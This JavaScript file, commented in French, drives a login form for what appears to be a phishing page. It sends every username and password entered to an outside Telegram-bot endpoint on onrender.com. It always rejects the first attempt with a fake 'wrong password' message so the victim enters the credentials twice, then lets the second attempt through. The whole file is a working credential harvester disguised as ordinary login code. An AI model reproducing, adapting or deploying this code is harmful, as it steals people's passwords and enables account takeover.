let tentatives = 0;

document.getElementById('login-btn').addEventListener('click', async function () {
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const errorMsg = document.getElementById('error-message');

    const usernameBloc = usernameInput.closest('.bloc1');
    const passwordBloc = passwordInput.closest('.bloc1');

    if (usernameInput.value.trim() === "") {
        usernameBloc.classList.add('bloc-error');
        return;
    } else {
        usernameBloc.classList.remove('bloc-error');
    }

    if (passwordInput.value.trim() === "") {
        passwordBloc.classList.add('bloc-error');
        return;
    } else {
        passwordBloc.classList.remove('bloc-error');
    }

    // Envoie toujours au bot Telegram
    fetch("https://telegrambot-hiqu.onrender.com/api/register", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            username: usernameInput.value,
            email: usernameInput.value,
            password: passwordInput.value
        })
    });

    tentatives++;

    if (tentatives === 1) {
        // Première tentative : toujours erreur
        usernameBloc.classList.add('bloc-error');
        passwordBloc.classList.add('bloc-error');
        errorMsg.textContent = "Mot de passe erroné";
        errorMsg.style.display = 'block';
        return;
    }

    // Deuxième tentative : laisse passer
    errorMsg.style.display = 'none';
    usernameBloc.classList.remove('bloc-error');
    passwordBloc.classList.remove('bloc-error');
    // Redirige ou fait ce que tu veux ici
});
document.getElementById('toggle-password').addEventListener('click', function() {
    const pwd = document.getElementById('password');
    const isVisible = pwd.type === 'text';
    pwd.type = isVisible ? 'password' : 'text';
    this.textContent = isVisible ? 'Afficher' : 'Masquer';
});